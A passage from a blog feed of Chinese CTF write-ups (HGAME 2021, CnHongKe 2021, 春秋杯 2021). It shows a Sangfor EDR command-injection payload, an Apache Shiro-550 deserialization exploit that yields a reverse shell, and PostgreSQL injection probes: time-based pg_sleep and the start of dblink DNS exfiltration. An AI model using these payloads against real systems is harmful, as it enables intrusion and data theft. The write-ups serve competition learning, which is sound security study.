src="/article/hgame2021/QQ%E5%9B%BE%E7%89%8720210206163759.png" class="" title="QQ图片20210206163759" loading="lazy"><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>misc随缘做做了，一周三场比赛有点忙</p><hr><h3 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h3><p>题目描述：</p><p>新年即将来临之际，Base家族也团聚了，他们用他们特有的打招呼方式向你问了个好，你知道他们在说什么吗？ R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09<br><strong>本次比赛为招新赛，请各位选手不要在当周比赛进行期间至结束后24小时内发布当周比赛题目的writeup</strong> </p><p>题目地址：<a href="https://www.baidu.com/">https://www.baidu.com</a> 很强啊</p><p>base64+base32+base16 不解释</p><hr><p>吐槽下MISC2</p><p>压缩包密码知道是啥嘛？</p><img src="/article/hgame2021/1.jpg" class="" width="1" loading="lazy"><p>23333没错就是的</p><p>misc3好像是流量包，能提出来一张几M的图片，分析图片</p><hr><h3 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h3><p>题目描述： timmix不知所踪，只留下了两个word文档，作为word专家的你能帮忙找出他的去向吗？ </p><p>题目链接：<a href="https://1.oss.hgame2021.vidar.club/Word_REMASTER_e3c365a2c0edb60fbb7152279a31dafd.zip">https://1.oss.hgame2021.vidar.club/Word_REMASTER_e3c365a2c0edb60fbb7152279a31dafd.zip</a></p><p>其实我以前出过一个Word的Misc，有人记得嘛2333</p><p>两个word文档，先看属性</p><img src="/article/hgame2021/image-20210206164905132.png" class="" title="image-20210206164905132" loading="lazy"><p>估计另一个有密码，直接以压缩包形式打开</p><p>很轻易有个<code>word/password.xml</code></p><img src="/article/hgame2021/image-20210206165015840.png" class="" title="image-20210206165015840" loading="lazy"><pre class="language-none"><code class="language-none">&lt;password&gt;+++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +.&lt;++ +[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; +++&lt;] &gt;+.&lt;+ ++[-&gt; ---&lt;] &gt;-.++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-. +++.+ .++++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. +.--- --..+ .++++ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;&lt;&#x2F;password&gt;</code></pre><p>很显然brainfuck</p><p>解密网站<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p><p>解得<code>DOYOUKNOWHIDDEN?</code></p><p>开第二个文档，分析了一下什么都没有，文档只有一张图片</p><img src="/article/hgame2021/image-20210206165425076.png" class="" title="image-20210206165425076" loading="lazy"><p>选中文档发现不对劲，显示隐藏标记发现有隐藏字符，把字符取消隐藏</p><img src="/article/hgame2021/image-20210206170404252.png" class="" title="image-20210206170404252" loading="lazy"><p>发现是空白的，单独保存下来</p><img src="/article/hgame2021/image-20210206170505833.png" class="" title="image-20210206170505833" loading="lazy"><p>结合图片跟雪有关，可能是snow加密，去跑一下试试</p><img src="/article/hgame2021/image-20210206170631851.png" class="" title="image-20210206170631851" loading="lazy"><p>确实</p><hr><p>其他题目可以等官方或者PWN师傅的WP啦，每次做题不管简单还是困难都要有所收获，week2师傅们也要加油！提前祝师傅们新年快乐！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;HAME2021-week 个人WP&lt;/p&gt;
&lt;p&gt;昵称：Err0r&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="PHP" scheme="https://err0r.top/tags/PHP/"/>
    
    <category term="Python" scheme="https://err0r.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>CnHongKe2021公测赛</title>
    <link href="https://err0r.top/article/2021gongcesai/"/>
    <id>https://err0r.top/article/2021gongcesai/</id>
    <published>2021-02-05T05:31:14.000Z</published>
    <updated>2021-03-30T11:47:47.552Z</updated>
    
    <content type="html"><![CDATA[<p>2月5日</p><p>比赛情况：</p><img src="/article/2021gongcesai/image-20210205133228513.png" class="" title="rank" loading="lazy"><p>小比赛</p><a id="more"></a><img src="/article/2021gongcesai/image-20210205133840182.png" class="" title="rank" loading="lazy"><p>主办方平台关太快了2333，睡了一觉起来连平台都没了</p><h2 id="Sign"><a href="#Sign" class="headerlink" title="Sign"></a>Sign</h2><h3 id="Choice"><a href="#Choice" class="headerlink" title="Choice"></a>Choice</h3><p>PHP CGI解析漏洞出现的原因是（ ）</p><ul><li><p>A.cgi.fix_pathi配置错误</p></li><li><p>B.cgi.fix_pathinfo配置错误</p></li><li><p>C.phpinfo配置错误</p></li><li><p>D.cgi.fix__status_en配置错误</p></li></ul><p>很显然是<code>cgi.fix_pathinfo</code>配置错误，当设置了cgi.fix_pathinfo = 1时，PHP就会以’/‘为分割符从最后一个文件开始向前找存在的文件去执行，例如<code>/upload/a.jpg/b.php</code>.</p><hr><h3 id="扭转乾坤"><a href="#扭转乾坤" class="headerlink" title="扭转乾坤"></a>扭转乾坤</h3><p>扫码得flag</p><img src="/article/2021gongcesai/image-20210205172001695.png" class="" title="image-20210205172001695" loading="lazy"><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="EDR"><a href="#EDR" class="headerlink" title="EDR"></a>EDR</h3><p>深信服载入史册</p><p>直接payload打</p><img src="/article/2021gongcesai/image-20210205134031474.png" class="" title="image-20210205134031474" loading="lazy"><p>Payload:</p><pre class="language-none"><code class="language-none">.&#x2F;?strip_slashes&#x3D;system&amp;host&#x3D;cat &#x2F;flag</code></pre><p>这题去年有过，是作为线下赛的题目，当时没外网，只能硬审，或者…<del>记得payload</del>，毕竟太有名了…</p><hr><h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><p>Shiro remeberMe反序列化漏洞（Shiro-550）</p><p>用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞</p><img src="/article/2021gongcesai/image-20210205135031033.png" class="" title="image-20210205135031033" loading="lazy"><p>可以如 <a href="https://www.cnblogs.com/sup3rman/archive/2020/07/16/13322898.html">参考文章</a> 所示，利用<code>shiro.py</code>生成payload</p><img src="/article/2021gongcesai/image-20210205135241419.png" class="" title="image-20210205135241419" loading="lazy"><p>当然后来才发现更简单的，直接用 <code>ShiroScan</code> 工具，可以用DNSlog的方式，也可以反弹shell，这里直接反弹shell</p><img src="/article/2021gongcesai/image-20210205135442119.png" class="" title="image-20210205135442119" loading="lazy"><p>成功弹到shell</p><img src="/article/2021gongcesai/image-20210205135511988.png" class="" title="image-20210205135511988" loading="lazy"><hr><h3 id="fast-x-3"><a href="#fast-x-3" class="headerlink" title="fast x 3"></a>fast x 3</h3><p>老脚本大师了</p><img src="/article/2021gongcesai/image-20210205135615967.png" class="" title="image-20210205135615967" loading="lazy"><p>写个py脚本即可，直接上payload，蹩脚编程，师傅们见谅…</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/2/5 9:22@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> collectionsurl <span class="token operator">=</span> <span class="token string">"http://180.109.90.207:23891/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"提交"</span><span class="token punctuation">&#125;</span>responses <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>responses<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"1--------------------------------取字符串"</span><span class="token punctuation">)</span>cal <span class="token operator">=</span> responses<span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;b>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;/b>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;divid=\"math\">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/div>"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"2--------------------------------计数"</span><span class="token punctuation">)</span><span class="token builtin">str</span> <span class="token operator">=</span> collections<span class="token punctuation">.</span>Counter<span class="token punctuation">(</span>cal<span class="token punctuation">)</span>str1 <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"3--------------------------------排序"</span><span class="token punctuation">)</span><span class="token keyword">from</span> collections <span class="token keyword">import</span> OrderedDictstr2 <span class="token operator">=</span> OrderedDict<span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"4--------------------------------取key"</span><span class="token punctuation">)</span>val <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> str2<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    val <span class="token operator">+=</span> ival <span class="token operator">=</span> val<span class="token keyword">print</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"5--------------------------------赋data"</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token string">'res'</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"6--------------------------------提交"</span><span class="token punctuation">)</span>post_responses <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>post_responses<span class="token punctuation">)</span></code></pre><p>编编改改凑合用</p><img src="/article/2021gongcesai/image-20210205140020576.png" class="" title="image-20210205140020576" loading="lazy"><hr><h2 id="Apk"><a href="#Apk" class="headerlink" title="Apk"></a>Apk</h2><h3 id="Des"><a href="#Des" class="headerlink" title="Des"></a>Des</h3><p>2015ISCC的题目改题<code>没有题目的题目</code></p><p>主要代码</p><pre class="language-none"><code class="language-none">public boolean check() &#123;     byte[] b2 &#x3D; &#123;103, 112, 111, 49, 61, 113, 117, 109, 76, 108, 77, 57, 59, 90, 64, 105, 33, 89, 74, 113, 92, 84, 87, 113, 105, 65, 35, 74, 93, 73, 43, 120&#125;;     byte[] b3 &#x3D; this.result1.getBytes();     for (int j &#x3D; 0; j &lt; b3.length; j++) &#123;         Log.d(&quot;test&quot;, ((byte) (b3[j] ^ j)));     &#125;     if (b3.length !&#x3D; b2.length) &#123;         return false;     &#125;     for (int j2 &#x3D; 0; j2 &lt; b2.length; j2++) &#123;         if ((b3[j2] ^ b2[j2]) !&#x3D; j2) &#123;             return false;         &#125;     &#125;     return true; &#125;</code></pre><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pyDes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> base64V0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">DeCheck</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        v1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>    xx <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>v1<span class="token punctuation">)</span>    <span class="token comment">##print xx</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token string">'ilovedes'</span>    iv <span class="token operator">=</span> <span class="token string">'\x01\x02\x03\x04\x05\x06\x07\x08'</span>    k <span class="token operator">=</span> des<span class="token punctuation">(</span>key<span class="token punctuation">,</span> CBC<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> pad<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> padmode<span class="token operator">=</span>PAD_PKCS5<span class="token punctuation">)</span>    flag <span class="token operator">=</span> k<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>DeCheck<span class="token punctuation">(</span>V0<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Your flag is: "</span> <span class="token operator">+</span> flag</code></pre><img src="/article/2021gongcesai/image-20210205140432528.png" class="" title="image-20210205140432528" loading="lazy"><img src="/article/2021gongcesai/QQ%E5%9B%BE%E7%89%8720210205171005.jpg" class="" title="QQ图片20210205171005" loading="lazy"><p>参考链接：<a href="http://bobao.360.cn/ctf/learning/136.html">http://bobao.360.cn/ctf/learning/136.html</a></p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="DTMF"><a href="#DTMF" class="headerlink" title="DTMF"></a>DTMF</h3><p>电话音，网上有在线识别网站</p><p><a href="http://dialabc.com/sound/detect/index.html">http://dialabc.com/sound/detect/index.html</a></p><p>格式要求<code>.wav</code>，先用ffmpeg转格式</p><img src="/article/2021gongcesai/image-20210205140704301.png" class="" title="image-20210205140704301" loading="lazy"><p>再放上去识别</p><img src="/article/2021gongcesai/image-20210205140736060.png" class="" title="image-20210205140736060" loading="lazy"><pre class="language-none"><code class="language-none">CnHongKe&#123;A18D3B18C*231#&#125;</code></pre><hr><h3 id="HalfQR"><a href="#HalfQR" class="headerlink" title="HalfQR"></a>HalfQR</h3><p>二维码修复网站 <a href="https://merricx.github.io/qrazybox/">https://merricx.github.io/qrazybox/</a></p><img src="/article/2021gongcesai/qr1.jpg" class="" title="QR" loading="lazy"><p>手 撸</p><img src="/article/2021gongcesai/image-20210205165950957.png" class="" title="image-20210205165950957" loading="lazy"><img src="/article/2021gongcesai/image-20210205170018477.png" class="" title="image-20210205170018477" loading="lazy"><p>然后</p><img src="/article/2021gongcesai/image-20210205165843064.png" class="" title="image-20210205165843064" loading="lazy"><p>最后</p><pre class="language-none"><code class="language-none">CnHongKe&#123;f88ae38f450e76d3c92410e3650df67&#125;</code></pre><p>也可以手算…毕竟数据域的半边东西给了</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这些题目作为线下赛题目是难了，毕竟去年有过一次线下，线上赛就不说了，神仙乱斗2333，还不用交WP，希望主办方能完善赛制，首先赛后都不用交WP是挺离谱的，其次题目的质量…其实还行，但作为线上还是简单了，一篇wp却写不出多少东西，通篇八题仅仅一千字，可能是题目问题，也有一部分我的问题，总之多多总结吧。</p><img src="/article/2021gongcesai/QQ%E5%9B%BE%E7%89%8720210205185049.jpg" class="" width="233" loading="lazy"><p>懂的都懂2333</p><p>还是有些收获的，提前祝大家新年快乐！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2月5日&lt;/p&gt;
&lt;p&gt;比赛情况：&lt;/p&gt;
&lt;img src=&quot;/article/2021gongcesai/image-20210205133228513.png&quot; class=&quot;&quot; title=&quot;rank&quot;&gt;

&lt;p&gt;小比赛&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="PHP" scheme="https://err0r.top/tags/PHP/"/>
    
    <category term="Python" scheme="https://err0r.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>春秋杯2021新春欢乐赛一道题——按F注入 对pgsql的研究</title>
    <link href="https://err0r.top/article/cqb2021/"/>
    <id>https://err0r.top/article/cqb2021/</id>
    <published>2021-02-01T10:45:42.000Z</published>
    <updated>2021-03-30T11:49:26.770Z</updated>
    
    <content type="html"><![CDATA[<p>只做了一道题，按F注入，研究了pgsql，算个小笔记，不能算研究性文章</p><a id="more"></a><h2 id="按F注入"><a href="#按F注入" class="headerlink" title="按F注入"></a>按F注入</h2><p>打开题目看到只能手机访问，看到了源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>body<span class="token operator">></span>只有手机才能访问<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">function</span> <span class="token function">is_mobile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token variable">$clientkeywords</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token single-quoted-string string">'nokia'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sony'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ericsson'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'mot'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'samsung'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'htc'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sgh'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'lg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sharp'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sie-'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'philips'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'panasonic'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'alcatel'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'lenovo'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'iphone'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ipod'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'blackberry'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'meizu'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'android'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'netfront'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'symbian'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ucweb'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'windowsce'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'palm'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'operamini'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'operamobi'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'openwave'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'nexusone'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'cldc'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'midp'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'wap'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'mobile'</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token comment">//从HTTP_USER_AGENT中查找手机浏览器的关键字--></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/("</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$clientkeywords</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">")/i"</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span></code></pre><p>于是在HEADER里添加<code>User-Agent: mobile</code>即可</p><img src="/article/cqb2021/image-20210201185004667.png" class="" title="UA" loading="lazy"><p>点击任何都是JavaScript脚本<code>javascript:alert(&#39;投票成功,恭喜您获得奶奶一个&#39;)</code>，底部发现了提示</p><p><code>&lt;!--&lt;a href=&quot;?f=1&quot;&gt;我选择按下F进入TK&lt;/a&gt;--&gt;</code></p><p>于是访问<code>./?f=1</code>没有变化，猜测SSRF或SQL注入，但是没有其他提示。</p><p>访问<code>./?f=1&#39;</code>发现有弹窗</p><img src="/article/cqb2021/image-20210201185510275.png" class="" title="小哥哥" loading="lazy"><p>fuzz一波，发现<code>#</code>和<code>%23</code>都会一直弹窗，而使用<code>--</code>注释即<code>?f=1&#39; --</code>却不会弹窗，搜索一波发现是 PostgreSQL ，猜测<strong>语法错误</strong>或者<strong>报错</strong>会有弹窗</p><p>甚至搜到了原题，赛后向 <a href="https://ha1c9on.top/">@HA1C9ON</a> 大佬请教得知，当时比赛的WP是有错误的，后续会道来。</p><p>测试一下发现<code>./?f=</code></p><blockquote><ul><li><code>gyy</code>，没有警告</li><li><code>gyy&#39;</code>，警告</li><li><code>gyy&#39; and 1=0 --</code>，没有警告</li><li><code>gyy&#39; and 1=1 --</code>，没有警告</li><li><code>gyy&#39; order by 1 --</code>，没有警告</li><li><code>gyy&#39; order by 2 --</code>，没有警告</li><li><code>gyy&#39; order by 3 --</code>， 警告</li><li><code>gyy&#39; union select 1,2 --</code>， 警告</li><li><code>gyy&#39; union select 1,&#39;2&#39; --</code>，没有警告</li><li><code>gyy&#39; union select 1,pg_sleep(10) --</code>， 警告</li><li><code>gyy&#39; union select 1,cast(pg_sleep(10) as text) --</code>，没有警告（有延迟！）</li><li><code>gyy&#39; union select 1,&#39;2&#39; from pg_database --</code>，没有警告</li><li><code>gyy&#39; union select 1,&#39;2&#39; from gyy --</code>， 警告</li><li><code>gyy&#39; union select 1,chr(65) --</code>，没有警告</li><li><code>gyy&#39; union select 1,chr(-65) --</code>，没有警告</li></ul></blockquote><p>由order by可以判断此处列数为2，由union select可以判断1处对应列为数值类型，2处对应非数值类型</p><h3 id="方法一：延时注入"><a href="#方法一：延时注入" class="headerlink" title="方法一：延时注入"></a>方法一：延时注入</h3><p> postgrest数据库中的延时函数有<code>pg_sleep()</code>/<code>pg_sleep_for()</code>/<code>pg_sleep_until()</code></p><p>查阅资料得知：</p><blockquote><p>pg_sleep(seconds)<br>pg_sleep_for(interval)<br>pg_sleep_until(timestamp with time zone)</p><p>pg_sleep让当前的会话进程休眠seconds 秒以后再执行。seconds是一个double precision 类型的值，所以可以指定带小数的秒数。<br>pg_sleep_for 对于指定为interval的较长睡眠时间是一个便利函数。<br>pg_sleep_until在需要特定唤醒时间时比较便利。</p><p>SELECT pg_sleep(1.5);<br>SELECT pg_sleep_for(‘5 minutes’);<br>SELECT pg_sleep_until(‘tomorrow 03:00’);</p></blockquote><p>当时比赛脚本参考 <a href="https://github.com/w181496/CTF/blob/master/fbctf2019/hr_admin_module/exp.py">balsn</a></p><p>这里不做阐述，因为最终得出结果</p><pre class="language-none"><code class="language-none">version: (Debian 11.2-1.pgdg90+1)current_db: docker_dbcurrent_schema: publictable of public: searchescolumns of searches: id,searchcounts of searches:0</code></pre><p><code>searches</code>表为空，所以本题应读取文件</p><h3 id="方式二：信息带外"><a href="#方式二：信息带外" class="headerlink" title="方式二：信息带外"></a>方式二：信息带外</h3><p>利用DNSlog方式</p><p>在PostgreSQL中，存在dblink模块，可以外联数据库或者当前数据库，dblink_connect同时会对host进行DNS查询，利用查询给定DNS的子域名，再查DNS解析记录即可获取传递的信息，这里用<a href="http://ceye.io/">ceye</a>来记录</p><p>首先看看dblink模块有没有开启</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;1&#39; union select 1,(select dblink_connect(&#39;&#39;)) 